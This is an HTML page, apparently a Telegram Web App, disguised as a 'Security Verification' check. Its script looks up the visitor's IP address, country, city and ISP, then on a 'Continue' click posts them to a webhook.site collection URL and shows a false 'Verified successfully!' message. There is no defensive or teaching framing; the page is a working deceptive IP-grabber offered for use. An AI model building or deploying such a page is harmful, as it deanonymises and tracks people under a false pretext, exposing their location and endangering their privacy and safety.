<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Verification</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #18222d;
            color: #ffffff;
            padding: 40px;
            text-align: center;
        }
        .btn {
            background-color: #2481cc;
            color: #ffffff;
            border: none;
            padding: 15px;
            border-radius: 10px;
            cursor: pointer;
            font-size: 18px;
            width: 100%;
            font-weight: bold;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <h2>Security Check</h2>
    <p id="status">Loading system data...</p>

    <button class="btn" id="submitBtn" style="display:none;" onclick="sendData()">Continue 🚀</button>

    <script>
        const tg = window.Telegram.WebApp;
        tg.ready();
        tg.expand();

        let payload = {};

        // جلب الـ IP والبيانات من الموقع الخارجي
        fetch('https://ipwho.is/')
            .then(res => res.json())
            .then(data => {
                if (data.success) {
                    payload = {
                        ip: data.ip,
                        country: data.country,
                        city: data.city,
                        isp: data.connection.isp,
                        time: new Date().toLocaleString()
                    };
                    document.getElementById('status').innerText = "Ready to verify.";
                    document.getElementById('submitBtn').style.display = "block";
                }
            }).catch(() => {
                document.getElementById('status').innerText = "Error loading data.";
            });

        function sendData() {
            // رابط الـ Webhook الخاص بك
            const webhookUrl = "https://webhook.site/54919f57-f545-4a1c-81d5-a6fdf4b037e";

            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            }).then(() => {
                document.getElementById('status').innerText = "Verified successfully!";
                setTimeout(() => { tg.close(); }, 1000);
            }).catch(() => {
                tg.close();
            });
        }
    </script>
</body>
</html>
